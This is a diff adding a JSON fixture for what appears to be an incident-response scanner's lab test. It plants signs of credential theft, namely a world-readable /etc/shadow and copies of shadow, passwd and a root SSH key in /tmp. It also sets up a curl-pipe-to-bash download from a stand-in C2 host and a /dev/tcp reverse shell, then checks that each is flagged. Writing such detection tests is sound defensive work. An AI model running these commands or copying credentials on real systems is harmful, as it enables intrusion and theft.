@@ -1,0 +1,43 @@
+{
+  "name": "credaccess_staging",
+  "incident_id": "IR-LAB-STAGING",
+  "description": "Credential theft and the staging that precedes exfiltration: the shadow file opened up, copies of credential stores parked in /tmp, an archive built ready to leave, and two live processes whose argv is the tradecraft — a download-and-execute and a bash reverse shell. The transfer itself is NOT tested: the lab endpoint has no route out, by design.",
+
+  "plant": [
+    {"id": "shadowmode", "type": "mode", "path": "/etc/shadow", "mode": "644"},
+
+    {"id": "credcopy",   "type": "staged_credentials",
+     "copies": {"/etc/shadow": "/tmp/ir-lab-shadow.bak",
+                "/etc/passwd": "/tmp/ir-lab-passwd.bak",
+                "/root/.ssh/id_ed25519": "/tmp/ir-lab-id_ed25519"}},
+
+    {"id": "archive",    "type": "file", "path": "/tmp/ir-lab-stage.tar.gz",
+     "content": "ir-lab staged archive standing in for collected data awaiting exfiltration\n"},
+
+    {"id": "downloadexec", "type": "proc_shell",
+     "command": "curl -s http://ir-lab-c2.example/stage2.sh | bash"},
+
+    {"id": "revshell",   "type": "proc_shell",
+     "command": "exec 3<>/dev/tcp/203.0.113.77/4444"}
+  ],
+
+  "expect": [
+    {"id": "a world-readable /etc/shadow is FLAGGED",
+     "finding_contains": "Shadow File World-Readable", "needs_plant": "shadowmode"},
+
+    {"id": "credential stores staged in /tmp are FLAGGED",
+     "finding_contains": "ir-lab-shadow.bak", "needs_plant": "credcopy"},
+
+    {"id": "a stolen private key staged in /tmp is FLAGGED",
+     "finding_contains": "ir-lab-id_ed25519", "needs_plant": "credcopy"},
+
+    {"id": "a download-and-execute process is FLAGGED",
+     "finding_contains": "stage2.sh", "needs_plant": "downloadexec"},
+
+    {"id": "a bash reverse shell is FLAGGED",
+     "finding_contains": "/dev/tcp/203.0.113.77", "needs_plant": "revshell"},
+
+    {"id": "files staged in /tmp are collected as recently modified",
+     "artifact": "recently_modified.txt", "contains": "ir-lab-stage.tar.gz", "needs_plant": "archive"}
+  ]
+}
